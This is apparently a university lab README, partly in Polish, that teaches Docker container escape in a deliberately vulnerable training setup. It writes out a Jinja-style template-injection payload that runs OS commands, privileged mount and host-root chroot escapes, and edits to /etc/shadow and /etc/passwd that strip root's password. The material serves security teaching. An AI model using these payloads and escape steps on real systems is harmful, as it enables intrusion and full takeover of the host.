
# Docker-Escape
This project shows vulnerability how to escape from Docker container in which web application is running. <br />

## About
This project was made for academic purposes during one of our courses at the AGH University of Krakow. <br />
We present security issues in Docker. We show vulnerabilities of this software and best practices related to them. Below we also include case-studies showing how to get into the server from the user level of a web application, how to escape from this container and the possibilities that open up to us after such an escape.<br />

  
## Authors:
[Huber Mąka](https://github.com/norka02) <br />
[Karol Makara](https://github.com/KarolMakara) <br />
[Jakub Kowal](https://github.com/jd-kowal) <br />

*** 

# Tasks


## Task 0 - Przygotowanie środowiska
Aby rozpocząć wykonywanie zadań sklonujcie repozytorium. <br />
Będziemy używać Dockera (kontener w kontenerze). Całość jest przygotowana w docker.file. <br />
Następnie wykonaj poniższe komendy. <br />

Build:
```bash: 
docker build -t ubuntu-dind .
```

Run:
```bash: 
docker run -d -p 5000:5000 --privileged --hostname ubuntu-dind --name ubuntu-dind ubuntu-dind
```

Enter:<br />
```bash: 
docker exec -itu adam ubuntu-dind bash
```

**TIP** - w przypadku problemów -> zrestartuj kontener 

## Task 1 - Dostęp do serwera z perspektywy użytkownika aplikacji webowej
Na kontenerze jest uruchomiona aplikacja webowa. Znając jej podatność omówioną podczas prezentacji spróbuj za pomocą preparacji url-a wykonać podstawowy pentesting (np. podawany podczas prezentacji przykład wyrażenia 7*7). <br />
Następnie jeżeli w wyniku wcześniejszego przykładu otrzymasz wynik 49 to możemy przejść dalej. <br />
Do następnej czynności będziemy potrzebowali poniższej komendy. <br />

```
"baiim".__class__.__base__.__subclasses__()[<Liczba_Którą_Znalazłeś>].__init__.__globals__['sys'].modules['os'].popen(<Twoja_Komenda>).read()
```

Najpierw jednak musimy znaleźć **LICZBĘ**. Aby ją odszukać użyj programu ``hack.py`` w konsoli.

**Odpowiedź** - wyślij ss, który wylistuje wszystkie pliki i katalogi z aktualnego katalogu (wpisz tą komendę w popen()) 

## Task 2 - Docker Escape & Privilege Escalation
**TIP** - proponujemy przejście z wykonywaniem zadań do terminala. Otwórz go w katalogu projektu.<br />
Ucieczkę z kontenera umożliwia nam złe skonfigurowanie kontenera. <br />

Spróbuj zmienić użytkownika na root-a (nie powinieneś mieć takiej możliwości - powinieneś być na adamie) {**PE**}: 
```
su root
```
Sprawdź listę dostępnych obrazów:
```
docker images
```
Pobierz obraz dockera z repozytorium:
```
docker pull ubuntu:18.04
```
![image](https://github.com/norka02/Docker-Escape/assets/121463460/e5f1fbfc-c4f9-4543-a6b0-f802d55b7039) <br />
Po pobraniu sprawdź czy obraz pobrał się poprawnie za pomocą:
```
docker images
```
Poniżej zostały przedstawione dwie przykładowe możliwości stworzenia kontenera z podatnością:
1. ```
docker run --rm -it --name kontener-adama --hostname ubuntu-by-adam --privileged ubuntu:18.04 bash
```
2. ```
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash
```

Pierwsza opcja pozwoli nam stworzyć kontener z flagą ``--priviliged``, dzięki której będzie możliwe poprzez zmontowanie partycji wyjście do systemu hosta. <br />
W zależności od solidności zabezpieczeń serwera będzie można edytować pliki na maszynie hosta lub tylko je czytać. <br />
Druga opcja daje nam z regły dużo większe możliwości jako osobie która uruchamia kontener, ale także dużo większe możliwości dla potencjalnego atakującego. <br />
W skrócie montuje ona volumen z katalogu root hosta do katalogu /host w kontenerze dzięki czemu możemy przykładowo przesyłać pliki między hostem a kontenerem. <br />

Zacznijmy od scenariusza pierwszego. <br />
Będąc na użytkowniku **adam** uruchom kontener {**DE**}:

Teraz jesteś wewnątrz swojego kontenera, którego przed chwilą stworzyłeś. Możesz to sprawdzić za pomocą komend ``whoami`` oraz ``hostname``. <br />
Przykładowy ScreenShot znajduje się poniżej.
![image2](https://github.com/norka02/Docker-Escape/assets/94318576/7a2266e8-ce4f-44dd-9a3d-e93341a36755) <br />
Jak możesz zauważyć tworząc własny kontener masz w nim uprawnienia root-a. <br />
Następnie stwórz w swoim kontenerze z obrazem ubuntu katalog: <br />
```bash
mkdir -p /mnt/share
```
Oraz podmontuj odpowiednią partycję dysku do tego katalogu np. /dev/sdc: <br />
```bash
mount /dev/sdc /mnt/share
```
Domyślnie polecenie mount nadaje ci prawa do zapisu i odczytu, ale jeśli wystąpiłby przykładowo taki komunikat: <br />
![image3](https://github.com/norka02/Docker-Escape/assets/94318576/d1cd3e07-3672-4086-bb40-2b86b14bceb5) <br />
Zmień partycję dysku. Listę partycji możesz uzyskać za pomocą polecenia: <br />
```bash
lsblk
```
Dzięki podmontowaniu partycji jesteśmy w stanie uzyskać dostep do struktury katalogów hosta. 

Sprawdź czy masz dostęp do struktury katalogów hosta:
```bash
 ls -l /mnt/share 
```
Poszperaj trochę po systemie. Może znajdziesz coś ciekawego ;). <br />
PS: Zobacz jak niewiele trzeba do wycieku danych. <br />

Wyjdź z kontenera za pomocą ``exit``. <br />


Teraz przejdźmy do scenariusza drugiego. Uruchom kontener za pomocą wcześniej podanej komendy. Następnie wylistuj strukturę katalogów w której obecnie się znajdujesz. <br />
Spróbuj przedostać się do zewnętrznego systemu plików, odnajdź pliki ``/etc/shadow`` oraz ``/etc/passwd`` i usuń w nich elementy odpowiadające za uwierzytelnienie użytkownika root. <br />

  *Jeżeli nie masz zainstalowengo żadnego edytora tekstowego wykonaj poniższe komendy:*
  ```bash
  apt update
  ```
  
  *Instalacja w kontenerze wybranego przez siebie edytora tekstowego (np. vim, nano).* 
  ```bash
  apt install vim
  ```

Za pomocą edytora tekstowego otwórz plik ``/etc/shadow`` oraz ``/etc/passwd``.  <br />


Trzeba usunąć część wskazującą na obecność hasła root-a w pliku shadow {**PE**}. Zrób tak samo z plikiem passwd. <br />

![image5](https://github.com/norka02/Docker-Escape/assets/94318576/8bf49b45-925b-4c12-b7a5-9a6a5cbf5b4b)
![image4](https://github.com/norka02/Docker-Escape/assets/94318576/f38a79ad-7e7a-4e0b-a404-cfce4b5aaea8)
<br />

Wyjdź z kontenera za pomocą ``exit``. <br />

Zmień użytkownika na root-a {**PE**}:
```
su root
```
Brawo właśnie przejąłeś konto roota! <br />

**Odpowiedź** - wyślij ss potwierdzającego twoje uprawnienia root-a. 

## Task 3 - Mini-CTF
Mając uprawnienia root-a możesz poruszać się bezproblemowo po systemie. Znajdź katalog, który nie powinien znajdować się w systemie/wyróżnia się spośród pozostałych. W nim znajduje się plik z flagą. Zmodyfikuj znaleziony plik dodając swoje imię i nazwisko. <br />
Flaga znajduje się w pliku tekstowym i jest oznaczona w następujący sposób:
```
CTF{<flaga>}
```

**Odpowiedź** - wyślij widoczną zmodyfikowaną flagę wraz z dopisanym unikalnym tekstem wymienionym wyżej oraz ścieżkę do katalogu, w którym znajduje się znaleziona flaga. 

## Task 4 - Tworzenie Bezpiecznego Kontenera
Posiadając całą wiedzę zdobytą podczas prezentacji oraz poprzednich tasków zastanów się w jaki sposób możesz zabezpieczyć kontener przed różnymi wektorami ataków. <br />
Stwórz kontener, który spełnia wszystkie best-practice dot. bezpiecznego tworzenia kontenera Dockera. <br />
<br />
**Odpowiedź** - wyślij widoczną komendę, która tworzy **Bezpieczny Kontener**. <br />
